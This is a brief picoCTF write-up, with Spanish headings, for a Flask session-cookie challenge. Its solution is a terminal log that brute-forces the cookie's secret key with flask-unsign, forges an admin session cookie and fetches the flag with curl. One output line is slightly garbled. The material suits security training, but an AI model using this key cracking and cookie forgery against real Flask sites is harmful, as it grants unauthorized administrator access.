## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)
## Solución
```
┌──(kali㉿kali)-[~/Documents]
└─$ python -m venv ~/.venv
                                                                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ source ~/.venv/bin/activate
                                                                                                       
┌──(.venv)─(kali㉿kali)-[~/Documents]
└─$ pip install flask-unsign

┌──(.venv)─(kali㉿kali)-[~/Documents]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aNq0PQ.HE3FVrx1YKqROdwtbmwYJ4Gz6Mc" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'

┌──(.venv)─(kali㉿kali)-[~/Documents]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'gingersnap'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNyjtA.OzQtQWnXp16LeUJgNPDtVREarus
 
┌──(.venv)─(kali㉿kali)-[~]
└─$ curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNyjtA.OzQtQWnXp16LeUJgNPDtVREarus" | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_5f016958}</code></p>
            
```
## Notas
## Referencias
